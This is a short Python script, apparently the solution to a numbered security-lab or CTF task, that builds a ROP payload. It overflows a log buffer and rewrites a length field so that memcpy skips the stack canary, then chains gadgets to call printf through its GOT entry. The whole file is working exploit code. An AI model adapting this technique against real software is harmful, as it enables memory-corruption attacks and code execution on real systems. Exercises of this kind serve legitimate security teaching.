#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log (canary)."""
import sys


def q(x):
    """8字节小端。"""
    return x.to_bytes(8, "little")


PRINTF_GOT = 0x602028  # printf的GOT项，间接调用时从这里取printf地址
FORMAT = 0x4018c8      # grade_eval用的格式串
POP6 = 0x40189a        # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
RET = 0x4018a4         # ret，用于栈对齐
MOV_CALL = 0x401880    # mov r13d,edi; call *[r12+rbx*8]

# 前128字节放在expression里，会被memcpy搬到saved RBP/返回地址处
# 依次是假saved RBP、POP6、六个pop值（rbx=0、rbp=1、r12=printf@got、r13=格式串、r14='A'、r15=0）、RET、MOV_CALL
chain = q(0x4242424242424242)
chain += q(POP6)
chain += q(0)
chain += q(1)
chain += q(PRINTF_GOT)
chain += q(FORMAT)
chain += q(0x41)
chain += q(0)
chain += q(RET)
chain += q(MOV_CALL)
chain += b"A" * (128 - len(chain))

# 128字节填满logMsg，再把f.len改成0xa0，让memcpy跳过Canary直接写到saved RBP处
payload = chain + b"C" * 128
payload += (0xA0).to_bytes(4, "little")
payload += b"\n"

sys.stdout.buffer.write(payload)
